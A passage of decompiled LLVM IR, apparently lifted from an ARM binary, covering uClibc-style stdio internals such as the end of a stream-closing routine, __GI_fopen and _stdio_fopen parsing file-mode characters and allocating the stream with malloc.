  store i1 %v2_15378, i1* %cpsr_c.global-to-local, align 1
  %v7_1537c = icmp slt i32 %v1_15370, 2
  br i1 %v7_1537c, label %dec_label_pc_15398, label %dec_label_pc_15380

dec_label_pc_15380:                               ; preds = %dec_label_pc_15378
  %v0_15380 = load i32, i32* @r7, align 4
  store i32 %v0_15380, i32* %r0.global-to-local, align 4
  %v0_15384 = load i32, i32* %r1.global-to-local, align 4
  %v1_15384 = add i32 %v0_15384, 129
  store i32 %v1_15384, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15398

dec_label_pc_15398:                               ; preds = %dec_label_pc_15310, %dec_label_pc_15380, %dec_label_pc_15378
  %v0_15398 = load i32, i32* @r5, align 4
  %v1_15398 = inttoptr i32 %v0_15398 to i16*
  %v2_15398 = load i16, i16* %v1_15398, align 2
  %v3_15398 = zext i16 %v2_15398 to i32
  %v1_1539c = and i32 %v3_15398, 24576
  %v1_153a0 = or i32 %v1_1539c, 48
  store i32 %v1_153a0, i32* %r3.global-to-local, align 4
  %v0_153a4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153a4 = icmp eq i32 %v0_153a4, 0
  %v1_153a8 = trunc i32 %v1_153a0 to i16
  store i16 %v1_153a8, i16* %v1_15398, align 2
  br i1 %v2_153a4, label %dec_label_pc_153b0, label %dec_label_pc_15424

dec_label_pc_153b0:                               ; preds = %dec_label_pc_15398
  %v0_153b0 = load i32, i32* @r5, align 4
  %v1_153b0 = add i32 %v0_153b0, 60
  %v2_153b0 = inttoptr i32 %v1_153b0 to i32*
  %v3_153b0 = load i32, i32* %v2_153b0, align 4
  %v1_153b4 = add i32 %v3_153b0, -1
  store i32 %v1_153b4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153b8 = icmp eq i32 %v1_153b4, 0
  store i32 %v1_153b4, i32* %v2_153b0, align 4
  br i1 %v2_153b8, label %dec_label_pc_153c4, label %dec_label_pc_15424

dec_label_pc_153c4:                               ; preds = %dec_label_pc_153b0
  %v0_153c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_153c4 = load i32, i32* @r5, align 4
  %v2_153c4 = add i32 %v1_153c4, 64
  %v3_153c4 = inttoptr i32 %v2_153c4 to i32*
  store i32 %v0_153c4, i32* %v3_153c4, align 4
  %v0_153c8 = load i32, i32* @r5, align 4
  %v1_153c8 = add i32 %v0_153c8, 56
  store i32 %v1_153c8, i32* @r6, align 4
  br label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %dec_label_pc_153fc.dec_label_pc_153cc_crit_edge, %dec_label_pc_153c4
  %v0_153d4 = phi i32 [ %v0_153d4.pre, %dec_label_pc_153fc.dec_label_pc_153cc_crit_edge ], [ %v1_153c8, %dec_label_pc_153c4 ]
  %v0_153cc = phi i32 [ %v0_153cc.pre, %dec_label_pc_153fc.dec_label_pc_153cc_crit_edge ], [ %v0_153c8, %dec_label_pc_153c4 ]
  %v1_153cc = add i32 %v0_153cc, 56
  %v2_153cc = inttoptr i32 %v1_153cc to i32*
  %v3_153cc = load i32, i32* %v2_153cc, align 4
  store i32 %v3_153cc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_153d4, i32* %r2.global-to-local, align 4
  %v1_153d882 = inttoptr i32 %v0_153d4 to i32*
  %v2_153d883 = load i32, i32* %v1_153d882, align 4
  store i32 %v2_153d883, i32* %r3.global-to-local, align 4
  %v3_153dc85 = icmp uge i32 %v2_153d883, %v3_153cc
  store i1 %v3_153dc85, i1* %cpsr_c.global-to-local, align 1
  %v9_153dc91 = icmp eq i32 %v2_153d883, %v3_153cc
  br i1 %v9_153dc91, label %dec_label_pc_153e4, label %dec_label_pc_153fc

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153cc, %dec_label_pc_153e4.dec_label_pc_153d8_crit_edge
  %v0_153e492 = phi i32 [ %v1_153dc.pre, %dec_label_pc_153e4.dec_label_pc_153d8_crit_edge ], [ %v3_153cc, %dec_label_pc_153cc ]
  store i32 %v0_153e492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_153f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153f4, label %dec_label_pc_153f8, label %dec_label_pc_153e4.dec_label_pc_153d8_crit_edge

dec_label_pc_153e4.dec_label_pc_153d8_crit_edge:  ; preds = %dec_label_pc_153e4
  %v0_153d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_153dc.pre = load i32, i32* @r4, align 4
  %v1_153d8 = inttoptr i32 %v0_153d8.pre to i32*
  %v2_153d8 = load i32, i32* %v1_153d8, align 4
  store i32 %v2_153d8, i32* %r3.global-to-local, align 4
  %v3_153dc = icmp uge i32 %v2_153d8, %v1_153dc.pre
  store i1 %v3_153dc, i1* %cpsr_c.global-to-local, align 1
  %v9_153dc = icmp eq i32 %v2_153d8, %v1_153dc.pre
  br i1 %v9_153dc, label %dec_label_pc_153e4, label %dec_label_pc_153fc

dec_label_pc_153f8:                               ; preds = %dec_label_pc_153e4
  %v0_153f8 = load i32, i32* @r4, align 4
  store i32 %v0_153f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_153fc

dec_label_pc_153fc:                               ; preds = %dec_label_pc_153cc, %dec_label_pc_153e4.dec_label_pc_153d8_crit_edge, %dec_label_pc_153f8
  %v0_15404 = phi i32 [ %v0_153f8, %dec_label_pc_153f8 ], [ %v2_153d883, %dec_label_pc_153cc ], [ %v2_153d8, %dec_label_pc_153e4.dec_label_pc_153d8_crit_edge ]
  %v1_153fc = phi i32 [ %v0_153f8, %dec_label_pc_153f8 ], [ %v3_153cc, %dec_label_pc_153cc ], [ %v1_153dc.pre, %dec_label_pc_153e4.dec_label_pc_153d8_crit_edge ]
  %v3_153fc = icmp uge i32 %v0_15404, %v1_153fc
  store i1 %v3_153fc, i1* %cpsr_c.global-to-local, align 1
  %v9_153fc = icmp eq i32 %v0_15404, %v1_153fc
  br i1 %v9_153fc, label %dec_label_pc_15404, label %dec_label_pc_153fc.dec_label_pc_153cc_crit_edge

dec_label_pc_153fc.dec_label_pc_153cc_crit_edge:  ; preds = %dec_label_pc_153fc
  %v0_153cc.pre = load i32, i32* @r5, align 4
  %v0_153d4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_153cc

dec_label_pc_15404:                               ; preds = %dec_label_pc_153fc
  %v2_15404 = icmp ne i32 %v1_153fc, 0
  store i1 %v2_15404, i1* %cpsr_c.global-to-local, align 1
  %v7_15408 = icmp slt i32 %v1_153fc, 2
  br i1 %v7_15408, label %dec_label_pc_15424, label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %dec_label_pc_15404
  %v0_1540c = load i32, i32* @r5, align 4
  %v1_1540c = add i32 %v0_1540c, 56
  store i32 %v1_1540c, i32* %r0.global-to-local, align 4
  %v0_15410 = load i32, i32* %r1.global-to-local, align 4
  %v1_15410 = add i32 %v0_15410, 129
  store i32 %v1_15410, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15424

dec_label_pc_15424:                               ; preds = %dec_label_pc_153b0, %dec_label_pc_15398, %dec_label_pc_1540c, %dec_label_pc_15404
  %v0_15424 = load i32, i32* @r5, align 4
  %v1_15424 = inttoptr i32 %v0_15424 to i16*
  %v2_15424 = load i16, i16* %v1_15424, align 2
  %v3_15424 = zext i16 %v2_15424 to i32
  store i32 %v3_15424, i32* %r3.global-to-local, align 4
  %v1_15428 = and i32 %v3_15424, 16384
  %v2_15428 = icmp eq i32 %v1_15428, 0
  br i1 %v2_15428, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_15424
  %v2_1542c = add i32 %v0_15424, 8
  %v3_1542c = inttoptr i32 %v2_1542c to i32*
  %v4_1542c = load i32, i32* %v3_1542c, align 4
  store i32 %v4_1542c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_15424, %bb48
  %v1_15430 = xor i1 %v2_15428, true
  call void @__pseudo_cond_branch(i1 %v1_15430, i32 ptrtoint (i32* @global_var_12874.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15438 = load i32, i32* @r8, align 4
  %v2_15438 = add i32 %v0_15438, 160
  %v3_15438 = inttoptr i32 %v2_15438 to i32*
  %v4_15438 = load i32, i32* %v3_15438, align 4
  store i32 %v4_15438, i32* @r5, align 4
  %v1_1543c = add i32 %v4_15438, 8
  %v2_1543c = inttoptr i32 %v1_1543c to i32*
  %v3_1543c = load i32, i32* %v2_1543c, align 4
  store i32 %v3_1543c, i32* %r3.global-to-local, align 4
  %v1_15440 = load i32, i32* %sl.global-to-local, align 4
  %v3_15440 = icmp uge i32 %v3_1543c, %v1_15440
  store i1 %v3_15440, i1* %cpsr_c.global-to-local, align 1
  %v9_15440 = icmp eq i32 %v3_1543c, %v1_15440
  br i1 %v9_15440, label %dec_label_pc_15488, label %dec_label_pc_15448

dec_label_pc_15448:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15438, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1545475 = inttoptr i32 %v4_15438 to i32*
  %v2_1545476 = load i32, i32* %v1_1545475, align 4
  store i32 %v2_1545476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1545878 = icmp eq i32 %v2_1545476, 0
  br i1 %v9_1545878, label %dec_label_pc_15460, label %dec_label_pc_15478

dec_label_pc_15460:                               ; preds = %dec_label_pc_15448, %dec_label_pc_15460.dec_label_pc_15454_crit_edge
  %v0_1546079 = phi i32 [ %v1_15458.pre, %dec_label_pc_15460.dec_label_pc_15454_crit_edge ], [ 0, %dec_label_pc_15448 ]
  store i32 %v0_1546079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15470 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15470, label %dec_label_pc_15474, label %dec_label_pc_15460.dec_label_pc_15454_crit_edge

dec_label_pc_15460.dec_label_pc_15454_crit_edge:  ; preds = %dec_label_pc_15460
  %v0_15454.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15458.pre = load i32, i32* @r4, align 4
  %v1_15454 = inttoptr i32 %v0_15454.pre to i32*
  %v2_15454 = load i32, i32* %v1_15454, align 4
  store i32 %v2_15454, i32* %r3.global-to-local, align 4
  %v3_15458 = icmp uge i32 %v2_15454, %v1_15458.pre
  store i1 %v3_15458, i1* %cpsr_c.global-to-local, align 1
  %v9_15458 = icmp eq i32 %v2_15454, %v1_15458.pre
  br i1 %v9_15458, label %dec_label_pc_15460, label %dec_label_pc_15478

dec_label_pc_15474:                               ; preds = %dec_label_pc_15460
  %v0_15474 = load i32, i32* @r4, align 4
  store i32 %v0_15474, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15478

dec_label_pc_15478:                               ; preds = %dec_label_pc_15448, %dec_label_pc_15460.dec_label_pc_15454_crit_edge, %dec_label_pc_15474
  %v0_15478 = phi i32 [ %v0_15474, %dec_label_pc_15474 ], [ %v2_1545476, %dec_label_pc_15448 ], [ %v2_15454, %dec_label_pc_15460.dec_label_pc_15454_crit_edge ]
  %v1_15478 = phi i32 [ %v0_15474, %dec_label_pc_15474 ], [ 0, %dec_label_pc_15448 ], [ %v1_15458.pre, %dec_label_pc_15460.dec_label_pc_15454_crit_edge ]
  %v3_15478 = icmp uge i32 %v0_15478, %v1_15478
  store i1 %v3_15478, i1* %cpsr_c.global-to-local, align 1
  %v9_15478 = icmp eq i32 %v0_15478, %v1_15478
  br i1 %v9_15478, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_15478
  %v1_1547c = load i32, i32* @r5, align 4
  store i32 %v1_1547c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_15478, %bb50
  %v1_15480 = xor i1 %v9_15478, true
  call void @__pseudo_cond_branch(i1 %v1_15480, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_15484 = load i32, i32* %sl.global-to-local, align 4
  %v1_15484 = load i32, i32* @r5, align 4
  %v2_15484 = add i32 %v1_15484, 8
  %v3_15484 = inttoptr i32 %v2_15484 to i32*
  store i32 %v0_15484, i32* %v3_15484, align 4
  %v0_1548c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15488

dec_label_pc_15488:                               ; preds = %bb49, %bb51
  %v0_1548c = phi i32 [ %v0_15438, %bb49 ], [ %v0_1548c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1548c = add i32 %v0_1548c, 80
  %v3_1548c = inttoptr i32 %v2_1548c to i32*
  %v4_1548c = load i32, i32* %v3_1548c, align 4
  store i32 %v4_1548c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_15494 = add i32 %v0_1548c, 160
  %v3_15494 = inttoptr i32 %v2_15494 to i32*
  %v4_15494 = load i32, i32* %v3_15494, align 4
  store i32 %v4_15494, i32* %r0.global-to-local, align 4
  %v1_15498 = inttoptr i32 %v4_1548c to i32*
  %v2_15498 = load i32, i32* %v1_15498, align 4
  store i32 %v2_15498, i32* %r3.global-to-local, align 4
  %v1_1549c = add i32 %v4_15494, 4
  %v2_1549c = inttoptr i32 %v1_1549c to i32*
  %v3_1549c = load i32, i32* %v2_1549c, align 4
  store i32 %v3_1549c, i32* %r1.global-to-local, align 4
  %v1_154a0 = add i32 %v2_15498, 1
  store i32 %v1_154a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_154a4 = icmp eq i32 %v3_1549c, 0
  store i32 %v1_154a0, i32* %v1_15498, align 4
  br i1 %v2_154a4, label %dec_label_pc_154b0, label %dec_label_pc_15510

dec_label_pc_154b0:                               ; preds = %dec_label_pc_15488
  %v0_154b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_154b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_154b0 = add i32 %v1_154b0, 8
  %v3_154b0 = inttoptr i32 %v2_154b0 to i32*
  store i32 %v0_154b0, i32* %v3_154b0, align 4
  %v0_154b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_154b4, i32* @r5, align 4
  br label %dec_label_pc_154b8

dec_label_pc_154b8:                               ; preds = %dec_label_pc_154e8.dec_label_pc_154b8_crit_edge, %dec_label_pc_154b0
  %v0_154b8 = phi i32 [ %v0_154b8.pre, %dec_label_pc_154e8.dec_label_pc_154b8_crit_edge ], [ %v0_154b4, %dec_label_pc_154b0 ]
  %v1_154b8 = inttoptr i32 %v0_154b8 to i32*
  %v2_154b8 = load i32, i32* %v1_154b8, align 4
  store i32 %v2_154b8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_154b8, i32* %r2.global-to-local, align 4
  %v2_154c464 = load i32, i32* %v1_154b8, align 4
  store i32 %v2_154c464, i32* %r3.global-to-local, align 4
  %v3_154c866 = icmp uge i32 %v2_154c464, %v2_154b8
  store i1 %v3_154c866, i1* %cpsr_c.global-to-local, align 1
  %v9_154c872 = icmp eq i32 %v2_154c464, %v2_154b8
  br i1 %v9_154c872, label %dec_label_pc_154d0, label %dec_label_pc_154e8

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154b8, %dec_label_pc_154d0.dec_label_pc_154c4_crit_edge
  %v0_154d073 = phi i32 [ %v1_154c8.pre, %dec_label_pc_154d0.dec_label_pc_154c4_crit_edge ], [ %v2_154b8, %dec_label_pc_154b8 ]
  store i32 %v0_154d073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_154e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_154e0, label %dec_label_pc_154e4, label %dec_label_pc_154d0.dec_label_pc_154c4_crit_edge

dec_label_pc_154d0.dec_label_pc_154c4_crit_edge:  ; preds = %dec_label_pc_154d0
  %v0_154c4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_154c8.pre = load i32, i32* @r4, align 4
  %v1_154c4 = inttoptr i32 %v0_154c4.pre to i32*
  %v2_154c4 = load i32, i32* %v1_154c4, align 4
  store i32 %v2_154c4, i32* %r3.global-to-local, align 4
  %v3_154c8 = icmp uge i32 %v2_154c4, %v1_154c8.pre
  store i1 %v3_154c8, i1* %cpsr_c.global-to-local, align 1
  %v9_154c8 = icmp eq i32 %v2_154c4, %v1_154c8.pre
  br i1 %v9_154c8, label %dec_label_pc_154d0, label %dec_label_pc_154e8

dec_label_pc_154e4:                               ; preds = %dec_label_pc_154d0
  %v0_154e4 = load i32, i32* @r4, align 4
  store i32 %v0_154e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_154e8

dec_label_pc_154e8:                               ; preds = %dec_label_pc_154b8, %dec_label_pc_154d0.dec_label_pc_154c4_crit_edge, %dec_label_pc_154e4
  %v0_154f0 = phi i32 [ %v0_154e4, %dec_label_pc_154e4 ], [ %v2_154c464, %dec_label_pc_154b8 ], [ %v2_154c4, %dec_label_pc_154d0.dec_label_pc_154c4_crit_edge ]
  %v1_154e8 = phi i32 [ %v0_154e4, %dec_label_pc_154e4 ], [ %v2_154b8, %dec_label_pc_154b8 ], [ %v1_154c8.pre, %dec_label_pc_154d0.dec_label_pc_154c4_crit_edge ]
  %v3_154e8 = icmp uge i32 %v0_154f0, %v1_154e8
  store i1 %v3_154e8, i1* %cpsr_c.global-to-local, align 1
  %v9_154e8 = icmp eq i32 %v0_154f0, %v1_154e8
  br i1 %v9_154e8, label %dec_label_pc_154f0, label %dec_label_pc_154e8.dec_label_pc_154b8_crit_edge

dec_label_pc_154e8.dec_label_pc_154b8_crit_edge:  ; preds = %dec_label_pc_154e8
  %v0_154b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_154b8

dec_label_pc_154f0:                               ; preds = %dec_label_pc_154e8
  %v2_154f0 = icmp ne i32 %v1_154e8, 0
  store i1 %v2_154f0, i1* %cpsr_c.global-to-local, align 1
  %v7_154f4 = icmp slt i32 %v1_154e8, 2
  br i1 %v7_154f4, label %dec_label_pc_15510, label %dec_label_pc_154f8

dec_label_pc_154f8:                               ; preds = %dec_label_pc_154f0
  %v0_154f8 = load i32, i32* @r5, align 4
  store i32 %v0_154f8, i32* %r0.global-to-local, align 4
  %v0_154fc = load i32, i32* %r1.global-to-local, align 4
  %v1_154fc = add i32 %v0_154fc, 129
  store i32 %v1_154fc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15510

dec_label_pc_15510:                               ; preds = %dec_label_pc_15488, %dec_label_pc_154f8, %dec_label_pc_154f0
  %v0_15510 = call i32 @_stdio_openlist_dec_use()
  %v0_15514 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_15514, i32* %r0.global-to-local, align 4
  %v2_1551c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1551c, i32* @r4, align 4
  store i32 %v6_15204, i32* @r5, align 4
  store i32 %v9_15204, i32* @r6, align 4
  store i32 %v12_15204, i32* @r7, align 4
  ret i32 %v0_15514

; uselistorder directives
  uselistorder i32 %v0_154e4, { 1, 0, 2 }
  uselistorder i32 %v1_154c8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_154b8, { 1, 0 }
  uselistorder i32 %v0_1548c, { 1, 0 }
  uselistorder i32 %v0_15474, { 1, 0, 2 }
  uselistorder i32 %v1_15458.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15440, { 1, 0 }
  uselistorder i32 %v0_153f8, { 1, 0, 2 }
  uselistorder i32 %v1_153dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1536c, { 1, 0, 2 }
  uselistorder i32 %v1_15350.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15340, { 1, 0 }
  uselistorder i32 %v0_152fc, { 1, 0, 2 }
  uselistorder i32 %v1_152e0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_152c0, { 1, 0 }
  uselistorder i32 %v1_1524c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 45, 13, 16, 14, 15, 17, 19, 18, 1, 20, 21, 22, 23, 24, 26, 25, 46, 27, 28, 29, 30, 32, 31, 44, 33, 34, 35, 36, 37, 38, 39, 41, 40, 43, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 30, 31, 9, 10, 11, 12, 32, 33, 13, 14, 15, 16, 17, 34, 35, 18, 19, 21, 20, 1, 22, 23, 24, 25, 28, 29, 26, 27 }
  uselistorder i32 (i32)* @__GI___libc_close, { 28, 27, 6, 5, 31, 4, 30, 29, 3, 2, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 1 }
  uselistorder label %dec_label_pc_15510, { 1, 2, 0 }
  uselistorder label %dec_label_pc_154e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_154d0, { 1, 0 }
  uselistorder label %dec_label_pc_15488, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_15478, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15460, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_15424, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_153fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_153e4, { 1, 0 }
  uselistorder label %dec_label_pc_15398, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15370, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15358, { 1, 0 }
  uselistorder label %dec_label_pc_15310, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_15300, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152e8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15288, { 1, 0 }
  uselistorder label %dec_label_pc_1527c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1526c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15254, { 1, 0 }
}

define i32 @function_15528(i32 %arg1) local_unnamed_addr {
dec_label_pc_15528:
  %v0_15528 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15528, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15528
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15528, %bb
  %v10_15530 = phi i32 [ %arg1, %dec_label_pc_15528 ], [ 0, %bb ]
  ret i32 %v10_15530

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_15544 = call i32 @_stdio_fopen()
  ret i32 %v0_15544
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15554 = load i32, i32* @r4, align 4
  store i32 %v3_15554, i32* %stack_var_-24, align 4
  %v6_15554 = load i32, i32* @r5, align 4
  %v9_15554 = load i32, i32* @r6, align 4
  %v12_15554 = load i32, i32* @r7, align 4
  %v15_15554 = load i32, i32* @r8, align 4
  %v0_15558 = load i32, i32* @r1, align 4
  %v1_15558 = inttoptr i32 %v0_15558 to i8*
  %v2_15558 = load i8, i8* %v1_15558, align 1
  %v2_15560 = icmp ugt i8 %v2_15558, 113
  store i1 %v2_15560, i1* %cpsr_c.global-to-local, align 1
  %v7_15560 = icmp eq i8 %v2_15558, 114
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r8, align 4
  %v0_1556c = load i32, i32* @r0, align 4
  store i32 %v0_1556c, i32* @r7, align 4
  %v0_15570 = load i32, i32* @r2, align 4
  store i32 %v0_15570, i32* @r5, align 4
  %v0_15574 = load i32, i32* @r3, align 4
  store i32 %v0_15574, i32* @r6, align 4
  br i1 %v7_15560, label %dec_label_pc_155c8, label %dec_label_pc_1557c

dec_label_pc_1557c:                               ; preds = %entry
  %v2_1557c = icmp ugt i8 %v2_15558, 118
  store i1 %v2_1557c, i1* %cpsr_c.global-to-local, align 1
  %v7_1557c = icmp eq i8 %v2_15558, 119
  br i1 %v7_1557c, label %bb, label %dec_label_pc_15588

bb:                                               ; preds = %dec_label_pc_1557c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_155cc

dec_label_pc_15588:                               ; preds = %dec_label_pc_1557c
  %v2_15588 = icmp ugt i8 %v2_15558, 96
  store i1 %v2_15588, i1* %cpsr_c.global-to-local, align 1
  %v7_15588 = icmp eq i8 %v2_15558, 97
  br i1 %v7_15588, label %bb49, label %dec_label_pc_15594

bb49:                                             ; preds = %dec_label_pc_15588
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_155cc

dec_label_pc_15594:                               ; preds = %dec_label_pc_15588, %dec_label_pc_15664, %dec_label_pc_15638
  store i32 49004, i32* %r2.global-to-local, align 4
  %v0_15598 = call i32 @__aeabi_read_tp()
  store i32 %v0_15598, i32* %r0.global-to-local, align 4
  %v3_1559c = load i16, i16* @global_var_21510.336, align 2
  %v4_1559c = sext i16 %v3_1559c to i32
  store i32 %v4_1559c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_155a4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_155a4 = icmp eq i32 %v0_155a4, 0
  %v3_155a8 = add i32 %v4_1559c, %v0_15598
  %v4_155a8 = inttoptr i32 %v3_155a8 to i32*
  store i32 22, i32* %v4_155a8, align 4
  br i1 %v2_155a4, label %dec_label_pc_1596c, label %dec_label_pc_155b0

dec_label_pc_155b0:                               ; preds = %dec_label_pc_15688._crit_edge, %dec_label_pc_15594
  %v0_155b0 = load i32, i32* @r5, align 4
  %v1_155b0 = inttoptr i32 %v0_155b0 to i16*
  %v2_155b0 = load i16, i16* %v1_155b0, align 2
  %v3_155b0 = zext i16 %v2_155b0 to i32
  store i32 %v3_155b0, i32* %r3.global-to-local, align 4
  %v1_155b4 = and i32 %v3_155b0, 8192
  %v2_155b4 = icmp eq i32 %v1_155b4, 0
  br i1 %v2_155b4, label %dec_label_pc_1596c, label %dec_label_pc_155bc

dec_label_pc_155bc:                               ; preds = %dec_label_pc_155b0
  store i32 %v0_155b0, i32* @r0, align 4
  %v0_155c0 = call i32 @free()
  store i32 %v0_155c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1596c

dec_label_pc_155c8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_155cc

dec_label_pc_155cc:                               ; preds = %bb, %bb49, %dec_label_pc_155c8
  %v1_155e4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_155c8 ]
  %v1_155cc = add i32 %v0_15558, 1
  %v2_155cc = inttoptr i32 %v1_155cc to i8*
  %v3_155cc = load i8, i8* %v2_155cc, align 1
  %v2_155d0 = icmp ugt i8 %v3_155cc, 97
  store i1 %v2_155d0, i1* %cpsr_c.global-to-local, align 1
  %v7_155d0 = icmp eq i8 %v3_155cc, 98
  %v1_155cc.v0_15558 = select i1 %v7_155d0, i32 %v1_155cc, i32 %v0_15558
  store i32 %v1_155cc.v0_15558, i32* %r3.global-to-local, align 4
  %v1_155dc = add i32 %v1_155cc.v0_15558, 1
  %v2_155dc = inttoptr i32 %v1_155dc to i8*
  %v3_155dc = load i8, i8* %v2_155dc, align 1
  %v4_155dc = zext i8 %v3_155dc to i32
  store i32 %v4_155dc, i32* @r3, align 4
  %v2_155e0 = icmp ugt i8 %v3_155dc, 42
  store i1 %v2_155e0, i1* %cpsr_c.global-to-local, align 1
  %v7_155e0 = icmp eq i8 %v3_155dc, 43
  br i1 %v7_155e0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_155cc
  store i32 %v1_155e4, i32* @r3, align 4
  %v2_155e8 = add nuw nsw i32 %v1_155e4, 1
  store i32 %v2_155e8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_155cc, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_155ec = icmp eq i32 %v0_15570, 0
  br i1 %v2_155ec, label %dec_label_pc_155f4, label %dec_label_pc_15630

dec_label_pc_155f4:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_155f8 = call i32 @malloc()
  store i32 %v0_155f8, i32* %r0.global-to-local, align 4
  store i32 %v0_155f8, i32* @r5, align 4
